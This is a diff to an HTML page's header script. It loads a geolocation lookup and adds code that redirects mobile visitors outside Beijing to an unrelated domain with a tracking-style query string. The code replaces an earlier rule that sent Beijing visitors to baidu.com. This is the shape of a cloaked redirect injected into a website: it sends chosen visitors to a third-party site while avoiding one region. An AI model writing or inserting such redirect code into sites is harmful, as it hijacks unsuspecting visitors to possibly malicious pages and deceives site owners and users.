@@ -7,9 +7,11 @@
     <title>Document</title>
     <script language="javascript" type="text/javascript" src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>
     <script>
-        if (remote_ip_info.province === '\u5317\u4eac'){
-            window.location= 'http://www.baidu.com';
-        };
+        if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&!(remote_ip_info.province === '\u5317\u4eac')){
+            alert('手机')
+            window.location = "http://jiaozuolianyahu.flzhan.com/index.html?183064";
+        }
+
     </script>
 
 </head>
